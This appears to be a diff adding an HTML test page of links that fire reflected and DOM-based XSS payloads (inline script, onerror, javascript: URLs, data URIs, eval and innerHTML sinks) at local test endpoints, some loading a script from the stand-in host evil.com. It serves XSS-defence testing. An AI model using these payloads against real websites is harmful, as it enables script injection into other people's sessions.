@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Attacks</title>
+</head>
+<body>
+
+<h3>Inline</h3>
+<a href="reflected.php?body=<script>alert(1)</script>">Inline Script</a><br>
+<a href="reflected.php?body=<img src=&quot;fsgf&quot; onerror=&quot;alert(1)&quot;/>">Img OnError</a><br>
+<a href="reflected.php?body=<a href=&quot;javascript:alert(1)&quot;>click</a>">JavaScript URL</a><br/>
+<a href="reflected.php?body=<object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=&quot;></object>">Data URI</a><br/>
+<a href="reflected.php?eval=alert(&apos;XSS&apos;)">Eval</a><br/>
+<a href="reflected.php?setTimeout=alert(&apos;XSS&apos;)">SetTimeout</a><br/>
+<a href="reflected.php?function=alert(&apos;XSS&apos;)">Function</a>
+
+<h3>External</h3>
+<a href="reflected.php?body=<script src=&quot;http://evil.com/xss.js&quot;></script>">External Script</a><br/>
+<a href="reflected.php?head=<base href=&quot;http://evil.com/&quot; />">Base URI</a><br/>
+<a href="reflected.php?body=<object type=&quot;text/x-scriptlet&quot; data=&quot;http://evil.com/xss.js&quot;>">Scriptlet</a>
+
+<h3>DOM-Based</h3>
+<a href="dombased.php?sink=eval#alert(&apos;xss&apos;);">Eval</a><br/>
+<a href="dombased.php?sink=function#alert(&apos;xss&apos;);">Function</a><br/>
+<a href="dombased.php?sink=setTimeout#alert(&apos;xss&apos;);">SetTimeout</a><br/>
+<a href="dombased.php?sink=scriptSrc#http://evil.com/xss.js">script.src</a><br/>
+<a href="dombased.php?sink=scriptText#alert(&quot;XSS&quot;)">script.text</a><br/>
+<a href="dombased.php?sink=location#javascript:alert(&quot;XSS&quot;)">location</a><br/>
+<a href="dombased.php?sink=lochref#javascript:alert(1)">location.href</a><br/>
+<a href="dombased.php?sink=docwrite#<script>alert(&quot;xss&quot;)</script>">document.write</a><br/>
+<a href="dombased.php?sink=innerHTML#<img src=&quot;http://sdfgofgd.net/&quot; onerror=&quot;alert(1)&quot;>">node.innerHTML</a>
+
+</body>
+</html>
